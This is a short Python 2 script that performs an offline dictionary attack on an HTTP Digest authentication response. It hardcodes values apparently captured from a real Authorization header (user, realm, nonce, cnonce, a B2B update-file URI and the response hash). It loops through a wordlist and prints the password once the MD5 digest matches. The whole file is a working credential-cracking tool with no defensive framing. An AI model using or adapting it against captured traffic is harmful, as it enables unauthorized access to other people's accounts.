import hashlib
import sys

# change the variable of qop, method_uri , realm , nc , nonce, user ,response , cnonce from authorization http header 
# generate own dictionary file or use pre-generate file 

filename = sys.argv[1]
wd  = open(filename, 'r')
words = wd.readlines()
realm = "test application"
method_uri = "GET:/downloadB2B/test141/Update/updateInfo_50101.xml" 
qop = "auth"
nc = "00000001"
nonce = "SkAhfJKLBQA=4a246892b5049100b7e67ddc1c20c6106a7456d5"
user = "A2aB8Eyq"
response = "2e9871296c8e31f03aede1b632373765"
cnonce = "43be3409b59d6264"

def get_res():
    for password in words:
        hash1 = hashlib.md5("%s:%s:%s"%(user,realm,password.strip())).hexdigest()
        hash2 = hashlib.md5(method_uri).hexdigest()
        res = hashlib.md5("%s:%s:%s:%s:%s:%s"%(hash1,nonce,nc,cnonce,qop,hash2)).hexdigest()
        if res == response:
            print "#"*10 
            print "Cracked : hash %s"%res 
	    print "User		: %s"%user 
	    print "password 	: %s" %password 
            print "#"*10
            exit(0)
        else:
            print "tested hash %s "% res + "  but cannot crack "


if __name__ == '__main__':
    get_res()
